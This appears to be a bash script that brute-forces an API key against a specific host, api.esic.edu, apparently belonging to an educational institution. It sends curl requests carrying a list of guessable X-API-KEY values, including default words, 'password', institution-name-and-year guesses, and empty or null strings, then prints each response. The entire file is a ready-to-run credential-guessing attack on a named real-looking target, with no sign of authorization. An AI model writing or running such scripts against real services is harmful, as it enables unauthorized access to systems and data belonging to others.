#!/bin/bash
echo "[*] Fuzzing API with X-API-KEY header..."

# Common API keys and patterns
keys=(
    "test"
    "admin"
    "apikey"
    "api_key"
    "key"
    "secret"
    "password"
    "esic"
    "esic2024"
    "esic2025"
    "12345"
    "test123"
    "demo"
    "public"
    ""
    "null"
    "undefined"
)

for key in "${keys[@]}"; do
    echo "Testing X-API-KEY: $key"
    curl -s "https://api.esic.edu/?Center=madrid" -H "X-API-KEY: $key" --max-time 3 | head -3
    echo ""
done

# Try without Center parameter but with API key
echo "[*] Testing without Center parameter..."
for key in test admin apikey; do
    echo "X-API-KEY: $key"
    curl -s "https://api.esic.edu/" -H "X-API-KEY: $key" --max-time 3 | head -5
    echo ""
done
